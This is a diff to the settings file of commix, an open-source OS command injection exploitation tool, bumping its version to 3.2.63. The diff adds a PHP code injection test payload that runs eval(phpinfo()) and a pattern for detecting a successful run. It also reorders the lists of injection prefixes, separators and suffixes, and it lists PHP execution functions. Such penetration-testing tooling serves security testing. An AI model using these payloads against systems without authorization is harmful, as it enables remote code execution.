@@ -202,7 +202,7 @@ APPLICATION = "commix"
 DESCRIPTION_FULL = "Automated All-in-One OS Command Injection and Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
-VERSION_NUM = "3.2.62"
+VERSION_NUM = "3.2.63"
 STABLE_VERSION = False
 if STABLE_VERSION:
   VERSION = "v" + VERSION_NUM[:3] + "-stable"
@@ -238,12 +238,16 @@ INJECT_TAG = "INJECT_HERE"
 INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/]+' 
 
-#Basic heuristic checks for code injection warnings
-BASIC_TEST = "\\\\/{$}\\/\\"
+#Basic heuristic checks for code injection warnings or... phpinfo page ;)
+BASIC_TEST = "\\\\/{${eval(phpinfo())}}\\/\\"
+
+# Executed phpinfo()
+IDENTIFIED_PHPINFO = False
+CODE_INJECTION_PHPINFO = r"PHP Version </td><td class=\"v\">(([\w\.]+))"
 
 # Code injection warnings
-CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort", "assert", "preg_replace"]
 IDENTIFIED_WARNINGS = False
+CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort", "assert", "preg_replace"]
 
 SKIP_CODE_INJECTIONS = False
 SKIP_COMMAND_INJECTIONS = False
@@ -337,13 +341,13 @@ JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&
 EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]
 
 # The code injection prefixes.
-EVAL_PREFIXES = ["", "{${", ";", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]
+EVAL_PREFIXES = ["{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
 
 # The code injection separators.
 EVAL_SEPARATORS = ["", "%0a", "\\n", "%0d%0a", "\\r\\n"]
 
 # The code injection suffixes.
-EVAL_SUFFIXES = ["", "}}","\\\\", "//", "#", ".\"", ".'", ")}"]
+EVAL_SUFFIXES = ["}}", ".\"", ".'", "", "\\\\", "//", "#", ")}"]
 
 # The white-spaces
 WHITESPACE = ["%20"]
